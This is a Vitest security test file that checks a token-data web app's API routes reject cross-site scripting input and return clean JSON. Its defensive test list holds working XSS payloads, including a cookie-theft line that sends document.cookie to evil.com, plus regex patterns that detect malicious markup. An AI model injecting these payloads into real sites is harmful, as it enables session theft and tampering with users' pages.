/**
 * XSS (Cross-Site Scripting) security tests — OWASP A07.
 * Tests that XSS payloads never reach the response body or get executed.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { GET as getToken }  from '@/app/api/token/[address]/route';
import { GET as getOhlcv }  from '@/app/api/ohlcv/[address]/route';
import { GET as getTrades } from '@/app/api/trades/[address]/route';
import { GET as getTokens } from '@/app/api/tokens/route';

vi.stubGlobal('fetch', vi.fn());

function params(address: string) {
  return { params: Promise.resolve({ address }) };
}

const XSS_VECTORS = [
  // Classic
  '<script>alert(1)</script>',
  '<SCRIPT>alert(1)</SCRIPT>',
  '<ScRiPt>alert(1)</ScRiPt>',
  // HTML events
  '<img src=x onerror=alert(1)>',
  '<body onload=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<video src=1 onerror=alert(1)>',
  // Protocol handlers
  'javascript:alert(1)',
  'JAVASCRIPT:alert(1)',
  'jAvAsCrIpT:alert(1)',
  'vbscript:msgbox(1)',
  // Data URIs
  'data:text/html,<script>alert(1)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  // SVG
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  // Iframe
  '<iframe src=javascript:alert(1)>',
  "<iframe onload=alert(1)>",
  // DOM manipulation
  '"><script>document.body.innerHTML=""</script>',
  // Cookie theft
  '<script>fetch("https://evil.com?c="+document.cookie)</script>',
  // Encoded
  '&lt;script&gt;alert(1)&lt;/script&gt;',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  // Polyglots
  "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNLoAd=alert(1)//>\\x3e",
];

describe('XSS Prevention (OWASP A07)', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('API routes reject XSS in address parameter', () => {
    const routes = [
      { name: 'token', call: (p: string) => getToken(new Request(`http://localhost/api/token/${p}`), params(p)) },
      { name: 'ohlcv', call: (p: string) => getOhlcv(new Request(`http://localhost/api/ohlcv/${p}`), params(p)) },
      { name: 'trades', call: (p: string) => getTrades(new Request(`http://localhost/api/trades/${p}`), params(p)) },
    ];

    routes.forEach(({ name, call }) => {
      describe(`/api/${name}/[address]`, () => {
        XSS_VECTORS.forEach(vector => {
          it(`rejects: ${vector.slice(0, 50)}`, async () => {
            const res = await call(vector);
            expect(res.status).toBe(400);
          });
        });
      });
    });
  });

  describe('Response body never contains raw script tags', () => {
    XSS_VECTORS.slice(0, 10).forEach(vector => {
      it(`response body clean for: ${vector.slice(0, 40)}`, async () => {
        const res = await getToken(new Request(`http://localhost/api/token/${vector}`), params(vector));
        const text = await res.text();
        // None of these dangerous patterns should appear in the response
        expect(text).not.toMatch(/<script/i);
        expect(text).not.toMatch(/onerror=/i);
        expect(text).not.toMatch(/onload=/i);
        expect(text).not.toMatch(/javascript:/i);
        expect(text).not.toMatch(/vbscript:/i);
        expect(text).not.toMatch(/<iframe/i);
        expect(text).not.toMatch(/<svg/i);
      });
    });
  });

  describe('/api/tokens response does not reflect external data unsafely', () => {
    it('returns valid JSON array, not HTML', async () => {
      const res = await getTokens(new Request('http://localhost/api/tokens'));
      const contentType = res.headers.get('content-type') ?? '';
      expect(contentType).toContain('application/json');
      expect(contentType).not.toContain('text/html');
    });

    it('response body is valid JSON', async () => {
      const res = await getTokens(new Request('http://localhost/api/tokens'));
      const text = await res.text();
      expect(() => JSON.parse(text)).not.toThrow();
    });
  });

  describe('Content-Type prevents MIME sniffing', () => {
    it('/api/tokens sets application/json not text/html', async () => {
      const res = await getTokens(new Request('http://localhost/api/tokens'));
      expect(res.headers.get('content-type')).toContain('application/json');
    });

    it('/api/token/[address] error has application/json content-type', async () => {
      const res = await getToken(new Request('http://localhost/api/token/bad'), params('bad'));
      expect(res.headers.get('content-type')).toContain('application/json');
    });
  });
});
